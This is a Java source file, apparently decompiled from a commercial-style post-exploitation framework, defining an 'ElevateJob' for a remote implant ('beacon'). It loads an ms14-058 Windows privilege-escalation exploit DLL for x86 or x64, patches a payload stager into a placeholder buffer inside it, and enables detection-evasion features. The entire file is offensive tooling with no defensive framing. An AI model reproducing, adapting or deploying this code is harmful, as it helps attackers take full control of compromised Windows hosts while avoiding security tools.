package beacon.jobs;

import beacon.Job;
import beacon.TaskBeacon;
import common.CommonUtils;
import pe.PostExObfuscator;

public class ElevateJob extends Job {
   protected String commandz;
   protected String listener;
   protected byte[] stager;

   public ElevateJob(TaskBeacon var1, String var2, byte[] var3) {
      super(var1);
      this.listener = var2;
      this.stager = var3;
   }

   public String getDescription() {
      return "Tasked beacon to run " + this.listener + " via ms14-058";
   }

   public String getShortDescription() {
      return "elevate";
   }

   public String getDLLName() {
      return this.arch.equals("x64") ? "resources/elevate.x64.dll" : "resources/elevate.dll";
   }

   public String getTactic() {
      return "T1068";
   }

   public String getPipeName() {
      return "elevate";
   }

   public int getCallbackType() {
      return 0;
   }

   public int getWaitTime() {
      return 5000;
   }

   public byte[] fix(byte[] var1) {
      String var2 = CommonUtils.bString(var1);
      int var3 = var2.indexOf(CommonUtils.repeat("A", 1024));
      var2 = CommonUtils.replaceAt(var2, CommonUtils.bString(this.stager), var3);
      return CommonUtils.toBytes(var2);
   }

   public void obfuscate(PostExObfuscator var1, byte[] var2) {
      var1.enableEvasions();
   }
}
